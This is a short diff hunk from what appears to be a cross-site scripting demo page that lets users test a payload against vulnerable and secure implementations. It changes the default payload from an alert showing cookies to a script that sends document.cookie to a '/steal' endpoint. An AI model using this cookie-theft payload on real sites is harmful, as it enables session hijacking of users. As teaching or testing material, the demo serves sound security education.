@@ -127,7 +127,7 @@ Enter payload below and test vulnerable vs secure implementation.
 </p>
 
 <input id="xssPayload"
-value='<script>alert("Stolen Cookie: "+document.cookie)</script>'>
+value='<script>fetch('/steal?cookie='+document.cookie)</script>'>
 
 <br><br>
 
